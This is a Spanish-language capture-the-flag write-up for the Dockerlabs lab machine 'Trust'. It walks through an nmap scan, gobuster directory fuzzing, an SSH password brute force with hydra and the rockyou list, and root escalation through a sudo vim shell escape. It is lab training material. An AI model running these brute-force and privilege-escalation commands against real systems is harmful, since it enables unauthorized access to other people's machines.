# Trust

Plataforma: Dockerlabs
OS: Linux
Level: Very Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 4 de diciembre de 2024 21:12
IP: 172.17.0.2

## Recopilación de información

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p-  --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
```

![image.png](<imagenes/image 6.png>)

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

- **Identificación de vulnerabilidades**
    - 22
    - 80
    
    Fuzzing :
    
    ```bash
    gobuster dir -u http://172.17.0.2 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x php,txt
    ```
    
    Encontramos ruta : secret.php
    
    ![image.png](<imagenes/image 7.png>)
    

## Explotación

### Explotación 1

Al tener un usuario en la web y el puerto 22 abierto, probamos a bruteforcear el password con hydra:

```bash
hydra -l mario -P /usr/share/wordlist/rockyou.txt ssh://172.17.0.2 -v
```

![image.png](<imagenes/image 8.png>)

Obtenemos password :

Usuario: mario

Password: c*******e

### Escalada de privilegios

Accedemos por ssh con usuario y password. Buscamos binarios SUID

```bash
sudo -l
```

![image.png](<imagenes/image 9.png>)

Buscamos como explotar el binaro en GTFObins: vim

```bash
sudo vim -c ':!/bin/sh'

```

![image.png](<imagenes/image 10.png>)

## Conclusión

Enumeramos la maquina y con un fuzzing simple, encontramos pagina que nos da una pista de un posible usuario. Encontramos la contraseña por fuerza bruta y escalamos privilegios explotando el binario VIM